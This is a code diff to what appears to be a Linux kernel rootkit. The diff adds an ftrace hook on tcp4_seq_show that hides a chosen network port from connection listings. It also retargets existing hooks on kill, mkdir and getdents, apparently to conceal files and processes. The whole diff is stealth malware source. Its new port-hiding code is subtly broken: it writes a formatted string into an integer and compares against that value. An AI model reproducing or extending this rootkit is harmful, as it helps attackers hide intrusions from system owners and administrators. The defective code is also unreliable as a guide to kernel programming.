@@ -191,10 +191,32 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs){
         goto done;
     }
 
-done:
-    kfree(dirent_ker);
-    return ret;
+    done:
+        kfree(dirent_ker);
+        return ret;
+}
 
+/*
+ * hiding open ports that is equal to  PORT
+ * tcp4_seq_show
+*/
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
+    struct sock *sk = v;
+    int port;
+
+    sprintf(port , "%x", PORT);
+
+    /*
+     * Check if sk_num is PORT
+     * If sk doesn't point to anything, then it points to 0x1
+     */
+    if (sk != (struct sock *)0x1 && sk->sk_num == port){
+        return 0;
+    }
+    /*
+     * Otherwise, just return with the real tcp4_seq_show()
+     */
+    return orig_tcp4_seq_show(seq, v);
 }
 #else
 /**
@@ -357,8 +379,9 @@ done:
 #endif
 
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", hook_kill, &orig_kill),
-    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
-    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
